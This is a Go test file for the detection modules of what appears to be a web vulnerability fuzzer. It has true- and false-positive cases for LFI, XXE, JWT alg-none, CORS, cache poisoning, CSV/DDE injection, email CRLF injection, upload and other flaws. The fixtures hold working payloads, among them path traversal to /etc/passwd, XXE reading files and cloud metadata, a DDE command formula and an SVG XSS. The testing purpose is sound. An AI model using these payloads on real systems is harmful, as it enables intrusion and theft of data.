package vulns

import (
	"testing"

	"github.com/renansj/ryofuzz/internal/input"
	"github.com/renansj/ryofuzz/internal/mutator"
)

func TestLFIDetect(t *testing.T) {
	m := &LFIModule{}
	pt := input.InjectionPoint{Name: "file", Location: input.LocQueryParam}

	tests := []struct {
		name    string
		payload mutator.Payload
		base    string
		resp    string
		wantNil bool
	}{
		{"TP root:x:0:0", mutator.Payload{Value: "../../../etc/passwd", Point: pt, Module: "lfi", Variant: "basic"}, "normal", "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1", false},
		{"TP [fonts] win.ini", mutator.Payload{Value: "..\\..\\..\\windows\\win.ini", Point: pt, Module: "lfi", Variant: "windows"}, "normal", "[fonts]\n[extensions]", false},
		{"TP PATH= in proc environ", mutator.Payload{Value: "/proc/self/environ", Point: pt, Module: "lfi", Variant: "proc-env"}, "normal", "PATH=/usr/bin:/bin HOME=/root", false},
		{"FP indicator in baseline", mutator.Payload{Value: "../../../etc/passwd", Point: pt, Module: "lfi", Variant: "basic"}, "root:x:0:0:root in docs", "root:x:0:0:root in docs", true},
		{"FP clean response", mutator.Payload{Value: "../../../etc/passwd", Point: pt, Module: "lfi", Variant: "basic"}, "normal", "File not found", true},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			f := m.Detect(tc.payload, tc.base, 200, 100, tc.resp, 200, 110, nil)
			if tc.wantNil && f != nil {
				t.Fatalf("expected nil, got: %s", f.Title)
			}
			if !tc.wantNil && f == nil {
				t.Fatal("expected finding, got nil")
			}
		})
	}
}

func TestXXEDetect(t *testing.T) {
	m := &XXEModule{}
	pt := input.InjectionPoint{Name: "xml", Location: input.LocJSONBody}

	tests := []struct {
		name    string
		payload mutator.Payload
		base    string
		resp    string
		wantNil bool
	}{
		{"TP entity processed root:x", mutator.Payload{Value: `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`, Point: pt, Module: "xxe", Variant: "basic"}, "normal", "root:x:0:0:root:/root:/bin/bash", false},
		{"TP ami-id from metadata", mutator.Payload{Value: `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>`, Point: pt, Module: "xxe", Variant: "ssrf"}, "normal", "ami-id\ni-1234567", false},
		{"FP indicator in baseline", mutator.Payload{Value: `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`, Point: pt, Module: "xxe", Variant: "basic"}, "root:x:0:0 is shown here", "root:x:0:0 is shown here", true},
		{"FP clean response", mutator.Payload{Value: `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`, Point: pt, Module: "xxe", Variant: "basic"}, "normal", "XML parsed successfully", true},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			f := m.Detect(tc.payload, tc.base, 200, 100, tc.resp, 200, 110, nil)
			if tc.wantNil && f != nil {
				t.Fatalf("expected nil, got: %s", f.Title)
			}
			if !tc.wantNil && f == nil {
				t.Fatal("expected finding, got nil")
			}
		})
	}
}

func TestJWTDetect(t *testing.T) {
	m := &JWTModule{}
	pt := input.InjectionPoint{Name: "Authorization", Location: input.LocHeader}

	tests := []struct {
		name       string
		payload    mutator.Payload
		baseStatus int
		respStatus int
		wantNil    bool
	}{
		{"TP auth bypass 401->200", mutator.Payload{Value: "eyJhbGciOiJub25lIn0.eyJhZG1pbiI6dHJ1ZX0.", Point: pt, Module: "jwt", Variant: "alg-none"}, 401, 200, false},
		{"TP alg none accepted on 200 baseline", mutator.Payload{Value: "eyJhbGciOiJub25lIn0.eyJhZG1pbiI6dHJ1ZX0.", Point: pt, Module: "jwt", Variant: "alg-none"}, 200, 200, false},
		{"FP token rejected 401", mutator.Payload{Value: "eyJhbGciOiJub25lIn0.eyJhZG1pbiI6dHJ1ZX0.", Point: pt, Module: "jwt", Variant: "alg-none"}, 401, 401, true},
		{"FP token rejected 403", mutator.Payload{Value: "eyJhbGciOiJub25lIn0.eyJhZG1pbiI6dHJ1ZX0.", Point: pt, Module: "jwt", Variant: "alg-none"}, 401, 403, true},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			f := m.Detect(tc.payload, "body", tc.baseStatus, 100, "body", tc.respStatus, 110, nil)
			if tc.wantNil && f != nil {
				t.Fatalf("expected nil, got: %s", f.Title)
			}
			if !tc.wantNil && f == nil {
				t.Fatal("expected finding, got nil")
			}
		})
	}
}

func TestIDORDetect(t *testing.T) {
	m := &IDORModule{}
	pt := input.InjectionPoint{Name: "user_id", Location: input.LocQueryParam}

	tests := []struct {
		name    string
		payload mutator.Payload
		base    string
		resp    string
		wantNil bool
	}{
		{"TP 200 different body", mutator.Payload{Value: "2", Point: pt, Module: "idor", Variant: "enum"}, `{"name":"alice","email":"alice@x.com"}`, `{"name":"bob","email":"bob@x.com","address":"123 St"}`, false},
		{"FP 200 identical body", mutator.Payload{Value: "2", Point: pt, Module: "idor", Variant: "enum"}, `{"name":"alice"}`, `{"name":"alice"}`, true},
		{"FP short body", mutator.Payload{Value: "2", Point: pt, Module: "idor", Variant: "enum"}, "ok", "nope", true},
		{"FP 403 status", mutator.Payload{Value: "2", Point: pt, Module: "idor", Variant: "enum"}, "normal content", "forbidden", true},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			status := 200
			if tc.name == "FP 403 status" {
				status = 403
			}
			f := m.Detect(tc.payload, tc.base, 200, 100, tc.resp, status, 110, nil)
			if tc.wantNil && f != nil {
				t.Fatalf("expected nil, got: %s", f.Title)
			}
			if !tc.wantNil && f == nil {
				t.Fatal("expected finding, got nil")
			}
		})
	}
}

func TestMassAssignDetect(t *testing.T) {
	m := &MassAssignmentModule{}
	pt := input.InjectionPoint{Name: "body", Location: input.LocJSONBody}

	tests := []struct {
		name    string
		payload mutator.Payload
		resp    string
		wantNil bool
	}{
		{"TP field reflected json colon", mutator.Payload{Value: "admin=true", Point: pt, Module: "mass-assign", Variant: "admin", Metadata: map[string]string{"field": "admin", "value": "true"}}, `{"admin":true,"name":"user"}`, false},
		{"TP field reflected quoted string", mutator.Payload{Value: "role=admin", Point: pt, Module: "mass-assign", Variant: "role", Metadata: map[string]string{"field": "role", "value": "admin"}}, `{"role":"admin","name":"user"}`, false},
		{"FP field not reflected", mutator.Payload{Value: "admin=true", Point: pt, Module: "mass-assign", Variant: "admin", Metadata: map[string]string{"field": "admin", "value": "true"}}, `{"name":"user","role":"basic"}`, true},
		{"FP nil metadata", mutator.Payload{Value: "admin=true", Point: pt, Module: "mass-assign", Variant: "admin"}, `{"admin":true}`, true},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			f := m.Detect(tc.payload, "base", 200, 100, tc.resp, 200, 110, nil)
			if tc.wantNil && f != nil {
				t.Fatalf("expected nil, got: %s", f.Title)
			}
			if !tc.wantNil && f == nil {
				t.Fatal("expected finding, got nil")
			}
		})
	}
}

func TestOAuthDetect(t *testing.T) {
	m := &OAuthModule{}
	pt := input.InjectionPoint{Name: "redirect_uri", Location: input.LocQueryParam}

	tests := []struct {
		name    string
		payload mutator.Payload
		status  int
		headers map[string][]string
		resp    string
		wantNil bool
	}{
		{
			"TP Location with evil.com",
			mutator.Payload{Value: "https://evil.com", Point: pt, Module: "oauth", Variant: "redirect-domain-swap"},
			302,
			map[string][]string{"Location": {"https://evil.com?code=abc123"}},
			"",
			false,
		},
		{
			"TP evil.com in body with redirect status",
			mutator.Payload{Value: "https://evil.com", Point: pt, Module: "oauth", Variant: "redirect-protocol-relative"},
			302,
			map[string][]string{},
			"Redirecting to https://evil.com/callback",
			false,
		},
		{
			"FP normal 302 no evil.com in Location",
			mutator.Payload{Value: "https://evil.com", Point: pt, Module: "oauth", Variant: "redirect-domain-swap"},
			302,
			map[string][]string{"Location": {"https://legit.com/callback?code=abc"}},
			"",
			true,
		},
		{
			"FP 200 no redirect, no token",
			mutator.Payload{Value: "https://evil.com", Point: pt, Module: "oauth", Variant: "redirect-domain-swap"},
			200,
			map[string][]string{},
			"error: invalid redirect_uri",
			true,
		},
		{
			"TP state removed, token issued in Location",
			mutator.Payload{Value: "", Point: input.InjectionPoint{Name: "state", Location: input.LocQueryParam}, Module: "oauth", Variant: "state-removed"},
			302,
			map[string][]string{"Location": {"https://app.com/cb?code=abc123"}},
			"",
			false,
		},
		{
			"TP state removed, access_token in body",
			mutator.Payload{Value: "", Point: input.InjectionPoint{Name: "state", Location: input.LocQueryParam}, Module: "oauth", Variant: "state-removed"},
			200,
			map[string][]string{},
			`{"access_token":"eyJhbGciOiJ...","token_type":"bearer"}`,
			false,
		},
		{
			"FP state removed, no token issued",
			mutator.Payload{Value: "", Point: input.InjectionPoint{Name: "state", Location: input.LocQueryParam}, Module: "oauth", Variant: "state-removed"},
			200,
			map[string][]string{},
			`{"message":"state parameter required"}`,
			true,
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			f := m.Detect(tc.payload, "", 200, 100, tc.resp, tc.status, 110, tc.headers)
			if tc.wantNil && f != nil {
				t.Fatalf("expected nil, got: %s", f.Title)
			}
			if !tc.wantNil && f == nil {
				t.Fatal("expected finding, got nil")
			}
		})
	}
}

func TestCORSDetect(t *testing.T) {
	m := &CORSModule{}
	pt := input.InjectionPoint{Name: "Origin", Location: input.LocHeader}

	tests := []struct {
		name    string
		payload mutator.Payload
		headers map[string][]string
		wantNil bool
		wantSev string
	}{
		{
			"TP origin reflected + ACAC true",
			mutator.Payload{Value: "https://evil.com", Point: pt, Module: "cors", Variant: "origin-reflect"},
			map[string][]string{"Access-Control-Allow-Origin": {"https://evil.com"}, "Access-Control-Allow-Credentials": {"true"}},
			false, "high",
		},
		{
			"TP origin reflected only",
			mutator.Payload{Value: "https://evil.com", Point: pt, Module: "cors", Variant: "origin-reflect"},
			map[string][]string{"Access-Control-Allow-Origin": {"https://evil.com"}},
			false, "medium",
		},
		{
			"FP fixed ACAO not reflecting payload",
			mutator.Payload{Value: "https://evil.com", Point: pt, Module: "cors", Variant: "origin-reflect"},
			map[string][]string{"Access-Control-Allow-Origin": {"*"}},
			true, "",
		},
		{
			"FP origin not reflected",
			mutator.Payload{Value: "https://evil.com", Point: pt, Module: "cors", Variant: "origin-reflect"},
			map[string][]string{},
			true, "",
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			f := m.Detect(tc.payload, "", 200, 100, "", 200, 110, tc.headers)
			if tc.wantNil && f != nil {
				t.Fatalf("expected nil, got: %s", f.Title)
			}
			if !tc.wantNil {
				if f == nil {
					t.Fatal("expected finding, got nil")
				}
				if f.Severity != tc.wantSev {
					t.Fatalf("expected severity %s, got %s", tc.wantSev, f.Severity)
				}
			}
		})
	}
}

func TestCSPDetect(t *testing.T) {
	m := &CSPBypassModule{}
	pt := input.InjectionPoint{Name: "csp", Location: input.LocHeader, Method: "GET"}

	tests := []struct {
		name    string
		headers map[string][]string
		wantNil bool
		wantTtl string
	}{
		{
			"TP CSP absent",
			map[string][]string{},
			false, "CSP Missing",
		},
		{
			"TP unsafe-inline present",
			map[string][]string{"Content-Security-Policy": {"default-src 'self' 'unsafe-inline'; base-uri 'self'"}},
			false, "Weak CSP - Bypass possible",
		},
		{
			"TP unsafe-eval present",
			map[string][]string{"Content-Security-Policy": {"default-src 'self' 'unsafe-eval'; base-uri 'self'"}},
			false, "Weak CSP - Bypass possible",
		},
		{
			"TP data: URI allowed",
			map[string][]string{"Content-Security-Policy": {"default-src 'self' data:; base-uri 'self'"}},
			false, "Weak CSP - Bypass possible",
		},
		{
			"TP base-uri missing",
			map[string][]string{"Content-Security-Policy": {"default-src 'self'"}},
			false, "Weak CSP - Bypass possible",
		},
		{
			"FP strong complete CSP",
			map[string][]string{"Content-Security-Policy": {"default-src 'self'; script-src 'self'; base-uri 'self'; object-src 'none'"}},
			true, "",
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			p := mutator.Payload{Value: "csp-check", Module: "csp", Variant: "header-analysis", Point: pt}
			f := m.Detect(p, "", 200, 100, "", 200, 110, tc.headers)
			if tc.wantNil && f != nil {
				t.Fatalf("expected nil, got: %s", f.Title)
			}
			if !tc.wantNil {
				if f == nil {
					t.Fatal("expected finding, got nil")
				}
				if f.Title != tc.wantTtl {
					t.Fatalf("expected title %q, got %q", tc.wantTtl, f.Title)
				}
			}
		})
	}
}

func TestHostHeaderDetect(t *testing.T) {
	m := &HostHeaderModule{}
	pt := input.InjectionPoint{Name: "Host", Location: input.LocHeader}

	tests := []struct {
		name    string
		payload mutator.Payload
		base    string
		resp    string
		wantNil bool
	}{
		{"TP host injected reflected", mutator.Payload{Value: "evil.com", Point: pt, Module: "hostheader", Variant: "inject"}, "Welcome to site.com", "Welcome to evil.com", false},
		{"FP no reflection", mutator.Payload{Value: "evil.com", Point: pt, Module: "hostheader", Variant: "inject"}, "Welcome", "Welcome", true},
		{"FP already in baseline", mutator.Payload{Value: "evil.com", Point: pt, Module: "hostheader", Variant: "inject"}, "evil.com is blocked", "evil.com is blocked", true},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			f := m.Detect(tc.payload, tc.base, 200, 100, tc.resp, 200, 110, nil)
			if tc.wantNil && f != nil {
				t.Fatalf("expected nil, got: %s", f.Title)
			}
			if !tc.wantNil && f == nil {
				t.Fatal("expected finding, got nil")
			}
		})
	}
}

func TestCachePoisonDetect(t *testing.T) {
	m := &CachePoisonModule{}
	pt := input.InjectionPoint{Name: "X-Forwarded-Host", Location: input.LocHeader}

	tests := []struct {
		name    string
		payload mutator.Payload
		base    string
		resp    string
		headers map[string][]string
		wantNil bool
	}{
		{
			"TP unkeyed header reflected",
			mutator.Payload{Value: "evil.com", Point: pt, Module: "cache", Variant: "X-Forwarded-Host"},
			"<link href='https://legit.com/style.css'>",
			"<link href='https://evil.com/style.css'>",
			map[string][]string{"X-Cache": {"HIT"}},
			false,
		},
		{
			"FP no reflection",
			mutator.Payload{Value: "evil.com", Point: pt, Module: "cache", Variant: "X-Forwarded-Host"},
			"normal page",
			"normal page",
			map[string][]string{"X-Cache": {"HIT"}},
			true,
		},
		{
			"FP evil.com in baseline",
			mutator.Payload{Value: "evil.com", Point: pt, Module: "cache", Variant: "X-Forwarded-Host"},
			"blocked evil.com",
			"blocked evil.com",
			nil,
			true,
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			f := m.Detect(tc.payload, tc.base, 200, 100, tc.resp, 200, 110, tc.headers)
			if tc.wantNil && f != nil {
				t.Fatalf("expected nil, got: %s", f.Title)
			}
			if !tc.wantNil && f == nil {
				t.Fatal("expected finding, got nil")
			}
		})
	}
}

func TestCacheDeceptionDetect(t *testing.T) {
	m := &CacheDeceptionModule{}
	pt := input.InjectionPoint{Name: "path", Location: input.LocPath}

	tests := []struct {
		name    string
		payload mutator.Payload
		base    string
		resp    string
		status  int
		headers map[string][]string
		wantNil bool
	}{
		{
			"TP sensitive data in cached response",
			mutator.Payload{Value: "/profile.css", Point: pt, Module: "cache-deception", Variant: "path-suffix", Metadata: map[string]string{"suffix": ".css"}},
			`{"email":"user@x.com","token":"secret123"}`,
			`{"email":"user@x.com","token":"secret123"}`,
			200,
			map[string][]string{"X-Cache": {"HIT"}},
			false,
		},
		{
			"TP Age header indicates cached",
			mutator.Payload{Value: "/profile.js", Point: pt, Module: "cache-deception", Variant: "path-suffix", Metadata: map[string]string{"suffix": ".js"}},
			`{"session":"abc123"}`,
			`{"session":"abc123"}`,
			200,
			map[string][]string{"Age": {"120"}},
			false,
		},
		{
			"FP not cached (no cache headers)",
			mutator.Payload{Value: "/profile.css", Point: pt, Module: "cache-deception", Variant: "path-suffix", Metadata: map[string]string{"suffix": ".css"}},
			`{"email":"user@x.com"}`,
			`{"email":"user@x.com"}`,
			200,
			map[string][]string{},
			true,
		},
		{
			"FP status 404",
			mutator.Payload{Value: "/profile.css", Point: pt, Module: "cache-deception", Variant: "path-suffix", Metadata: map[string]string{"suffix": ".css"}},
			`{"email":"user@x.com"}`,
			"not found",
			404,
			map[string][]string{"X-Cache": {"HIT"}},
			true,
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			f := m.Detect(tc.payload, tc.base, 200, 100, tc.resp, tc.status, 110, tc.headers)
			if tc.wantNil && f != nil {
				t.Fatalf("expected nil, got: %s", f.Title)
			}
			if !tc.wantNil && f == nil {
				t.Fatal("expected finding, got nil")
			}
		})
	}
}

func TestOpenRedirectDetect(t *testing.T) {
	m := &OpenRedirectModule{}
	pt := input.InjectionPoint{Name: "next", Location: input.LocQueryParam}

	tests := []struct {
		name    string
		payload mutator.Payload
		status  int
		headers map[string][]string
		wantNil bool
	}{
		{
			"TP 302 Location evil.com",
			mutator.Payload{Value: "https://evil.com", Point: pt, Module: "redirect", Variant: "basic"},
			302,
			map[string][]string{"Location": {"https://evil.com"}},
			false,
		},
		{
			"TP 301 Location evil.com path",
			mutator.Payload{Value: "//evil.com", Point: pt, Module: "redirect", Variant: "basic"},
			301,
			map[string][]string{"Location": {"//evil.com/path"}},
			false,
		},
		{
			"FP 302 to legit domain",
			mutator.Payload{Value: "https://evil.com", Point: pt, Module: "redirect", Variant: "basic"},
			302,
			map[string][]string{"Location": {"https://legit.com/dashboard"}},
			true,
		},
		{
			"FP 200 no redirect",
			mutator.Payload{Value: "https://evil.com", Point: pt, Module: "redirect", Variant: "basic"},
			200,
			map[string][]string{},
			true,
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			f := m.Detect(tc.payload, "", 200, 100, "", tc.status, 110, tc.headers)
			if tc.wantNil && f != nil {
				t.Fatalf("expected nil, got: %s", f.Title)
			}
			if !tc.wantNil && f == nil {
				t.Fatal("expected finding, got nil")
			}
		})
	}
}

func TestBusinessLogicDetect(t *testing.T) {
	m := &BusinessLogicModule{}
	pt := input.InjectionPoint{Name: "amount", Location: input.LocQueryParam}

	tests := []struct {
		name    string
		payload mutator.Payload
		base    string
		resp    string
		status  int
		wantNil bool
	}{
		{
			"TP negative value accepted 200 no error",
			mutator.Payload{Value: "-100", Point: pt, Module: "logic", Variant: "negative-value"},
			`{"total":50}`,
			`{"total":-100}`,
			200,
			false,
		},
		{
			"TP zero value accepted",
			mutator.Payload{Value: "0", Point: pt, Module: "logic", Variant: "negative-value"},
			`{"total":50}`,
			`{"total":0}`,
			200,
			false,
		},
		{
			"FP value rejected with error",
			mutator.Payload{Value: "-1", Point: pt, Module: "logic", Variant: "negative-value"},
			`{"total":50}`,
			`{"error":"invalid amount"}`,
			200,
			true,
		},
		{
			"FP non-negative payload (99999999)",
			mutator.Payload{Value: "99999999", Point: pt, Module: "logic", Variant: "negative-value"},
			`{"total":50}`,
			`{"total":99999999}`,
			200,
			true,
		},
		{
			"FP same body as baseline",
			mutator.Payload{Value: "-1", Point: pt, Module: "logic", Variant: "negative-value"},
			`{"total":50}`,
			`{"total":50}`,
			200,
			true,
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			f := m.Detect(tc.payload, tc.base, 200, 100, tc.resp, tc.status, 110, nil)
			if tc.wantNil && f != nil {
				t.Fatalf("expected nil, got: %s", f.Title)
			}
			if !tc.wantNil && f == nil {
				t.Fatal("expected finding, got nil")
			}
		})
	}
}

func TestCSVInjectDetect(t *testing.T) {
	m := &CSVInjectModule{}
	pt := input.InjectionPoint{Name: "name", Location: input.LocFormBody}

	tests := []struct {
		name    string
		payload mutator.Payload
		resp    string
		headers map[string][]string
		wantNil bool
	}{
		{
			"TP formula reflected in CSV",
			mutator.Payload{Value: "=cmd|'/C calc'!A1", Point: pt, Module: "csv", Variant: "dde-cmd"},
			"name,email\n=cmd|'/C calc'!A1,test@x.com",
			map[string][]string{"Content-Type": {"text/csv"}},
			false,
		},
		{
			"TP cmd| reflected in excel",
			mutator.Payload{Value: "@SUM(1+1)*cmd|'/C calc'!A1", Point: pt, Module: "csv", Variant: "dde-at-sum"},
			"data with cmd| inside",
			map[string][]string{"Content-Type": {"application/vnd.ms-excel"}},
			false,
		},
		{
			"FP wrong Content-Type (json)",
			mutator.Payload{Value: "=cmd|'/C calc'!A1", Point: pt, Module: "csv", Variant: "dde-cmd"},
			"=cmd|'/C calc'!A1",
			map[string][]string{"Content-Type": {"application/json"}},
			true,
		},
		{
			"FP CSV but no reflection",
			mutator.Payload{Value: "=cmd|'/C calc'!A1", Point: pt, Module: "csv", Variant: "dde-cmd"},
			"name,email\njohn,john@x.com",
			map[string][]string{"Content-Type": {"text/csv"}},
			true,
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			f := m.Detect(tc.payload, "", 200, 100, tc.resp, 200, 110, tc.headers)
			if tc.wantNil && f != nil {
				t.Fatalf("expected nil, got: %s", f.Title)
			}
			if !tc.wantNil && f == nil {
				t.Fatal("expected finding, got nil")
			}
		})
	}
}

func TestEmailInjectDetect(t *testing.T) {
	m := &EmailInjectModule{}
	pt := input.InjectionPoint{Name: "email", Location: input.LocFormBody}

	tests := []struct {
		name    string
		payload mutator.Payload
		resp    string
		status  int
		wantNil bool
	}{
		{
			"TP CRLF injection success",
			mutator.Payload{Value: "victim@test.com\r\nBcc: attacker@evil.com", Point: pt, Module: "email-inj", Variant: "crlf-bcc"},
			`{"status":"email sent successfully"}`,
			200,
			false,
		},
		{
			"FP 400 status rejected",
			mutator.Payload{Value: "victim@test.com\r\nBcc: attacker@evil.com", Point: pt, Module: "email-inj", Variant: "crlf-bcc"},
			`{"error":"invalid email"}`,
			400,
			true,
		},
		{
			"FP no success indicator",
			mutator.Payload{Value: "victim@test.com\r\nBcc: attacker@evil.com", Point: pt, Module: "email-inj", Variant: "crlf-bcc"},
			`{"status":"pending review"}`,
			200,
			true,
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			f := m.Detect(tc.payload, "", 200, 100, tc.resp, tc.status, 110, nil)
			if tc.wantNil && f != nil {
				t.Fatalf("expected nil, got: %s", f.Title)
			}
			if !tc.wantNil && f == nil {
				t.Fatal("expected finding, got nil")
			}
		})
	}
}

func TestHPPDetect(t *testing.T) {
	m := &HPPModule{}
	pt := input.InjectionPoint{Name: "search", Location: input.LocQueryParam, OriginalValue: "test"}

	tests := []struct {
		name       string
		payload    mutator.Payload
		base       string
		resp       string
		baseStatus int
		respStatus int
		wantNil    bool
	}{
		{
			"TP status code change",
			mutator.Payload{Value: "test&search=hpp_test", Point: pt, Module: "hpp", Variant: "duplicate-param", Metadata: map[string]string{"original": "test", "param_name": "search"}},
			"results for test",
			"results for test",
			200, 500, false,
		},
		{
			"TP second value reflected",
			mutator.Payload{Value: "hpp_first&search=hpp_second", Point: pt, Module: "hpp", Variant: "duplicate-diff", Metadata: map[string]string{"original": "test", "param_name": "search"}},
			"results for test",
			"results for hpp_second",
			200, 200, false,
		},
		{
			"FP same status same body",
			mutator.Payload{Value: "test&search=hpp_test", Point: pt, Module: "hpp", Variant: "duplicate-param", Metadata: map[string]string{"original": "test", "param_name": "search"}},
			"results for test",
			"results for test",
			200, 200, true,
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			f := m.Detect(tc.payload, tc.base, tc.baseStatus, 100, tc.resp, tc.respStatus, 110, nil)
			if tc.wantNil && f != nil {
				t.Fatalf("expected nil, got: %s", f.Title)
			}
			if !tc.wantNil && f == nil {
				t.Fatal("expected finding, got nil")
			}
		})
	}
}

func TestPwResetDetect(t *testing.T) {
	m := &PwResetModule{}
	pt := input.InjectionPoint{Name: "Host", Location: input.LocHeader}

	tests := []struct {
		name    string
		payload mutator.Payload
		resp    string
		headers map[string][]string
		wantNil bool
	}{
		{
			"TP evil host in response URL",
			mutator.Payload{Value: "evil.com", Point: pt, Module: "pwreset", Variant: "host-header", Metadata: map[string]string{"evil_host": "evil.com"}},
			`Reset link: https://evil.com/reset?token=abc123`,
			nil,
			false,
		},
		{
			"TP evil host in response header",
			mutator.Payload{Value: "evil.com", Point: pt, Module: "pwreset", Variant: "x-forwarded-host", Metadata: map[string]string{"evil_host": "evil.com"}},
			"Password reset sent",
			map[string][]string{"X-Reset-Link": {"https://evil.com/reset?t=abc"}},
			false,
		},
		{
			"FP no reflection",
			mutator.Payload{Value: "evil.com", Point: pt, Module: "pwreset", Variant: "host-header", Metadata: map[string]string{"evil_host": "evil.com"}},
			"Password reset email sent to user@legit.com",
			nil,
			true,
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			f := m.Detect(tc.payload, "", 200, 100, tc.resp, 200, 110, tc.headers)
			if tc.wantNil && f != nil {
				t.Fatalf("expected nil, got: %s", f.Title)
			}
			if !tc.wantNil && f == nil {
				t.Fatal("expected finding, got nil")
			}
		})
	}
}

func TestUploadDetect(t *testing.T) {
	m := &UploadModule{}
	pt := input.InjectionPoint{Name: "file", Location: input.LocFormBody}

	tests := []struct {
		name    string
		payload mutator.Payload
		base    string
		resp    string
		status  int
		wantNil bool
	}{
		{
			"TP SVG XSS reflected",
			mutator.Payload{Value: "<svg onload=alert(1)>", Point: pt, Module: "upload", Variant: "svg-xss"},
			"",
			"<svg onload=alert(1)>",
			200,
			false,
		},
		{
			"TP dangerous file stored (.php in response)",
			mutator.Payload{Value: "shell.php", Point: pt, Module: "upload", Variant: "ext-php"},
			"upload form",
			`{"url":"https://cdn.example.com/uploads/shell.php"}`,
			201,
			false,
		},
		{
			"FP status 403 rejected",
			mutator.Payload{Value: "shell.php", Point: pt, Module: "upload", Variant: "ext-php"},
			"",
			"File type not allowed",
			403,
			true,
		},
		{
			"FP no stored indicators",
			mutator.Payload{Value: "shell.php", Point: pt, Module: "upload", Variant: "ext-php"},
			"",
			"File uploaded",
			200,
			true,
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			f := m.Detect(tc.payload, tc.base, 200, 100, tc.resp, tc.status, 110, nil)
			if tc.wantNil && f != nil {
				t.Fatalf("expected nil, got: %s", f.Title)
			}
			if !tc.wantNil && f == nil {
				t.Fatal("expected finding, got nil")
			}
		})
	}
}
